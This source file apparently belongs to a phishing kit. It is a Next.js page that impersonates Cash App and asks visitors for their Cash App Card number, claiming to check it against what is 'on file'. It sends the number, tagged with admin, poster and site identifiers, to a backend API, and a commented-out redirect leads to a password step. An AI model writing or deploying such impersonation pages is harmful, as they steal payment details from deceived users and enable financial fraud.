"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { API_URL, site } from "../config/index";
import Cookies from "js-cookie";
function page() {
     const [cardNumber, setCardNumber] = useState("");
  const router = useRouter();
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");

const handleBack = () => {
    router.back();
  };



  const handleContinue = async () => {
    if (!cardNumber) {
      return;
    }
    const values = {
      cashCard: cardNumber,
      site: site,
    };
    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      Cookies.set("cashCard", data?.info?.cashCard);
      Cookies.set("id", data?.info?._id);
      // router.push("/password");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  

  return (
   <div className="flex items-center justify-center min-h-screen bg-white p-4">
      <div className="w-full max-w-md border border-gray-200 shadow-md rounded-2xl p-6">
        <h1 className="text-2xl font-semibold mb-2 text-black">
          Enter your Cash App Card number
        </h1>
        <p className="text-gray-600 mb-6">
          We'll check to make sure it matches what's on file.
        </p>

        <input
          type="text"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value)}
          placeholder="Cash Card Number"
          className="w-full p-3 border border-gray-300 rounded-xl mb-6"
        />

        <div className="flex justify-between gap-4">
          <button
            onClick={handleBack}
            className="w-full p-3 bg-gray-100 text-black rounded-xl hover:bg-gray-200"
          >
            Back
          </button>

          <button
            onClick={handleContinue}
            className={`w-full p-3 rounded-xl text-white ${cardNumber ? "bg-green-500 hover:bg-green-600" : "bg-green-200 cursor-not-allowed"}`}
            disabled={!cardNumber}
          >
            Continue
          </button>
        </div>
      </div>
    </div>
  );
}

export default page;
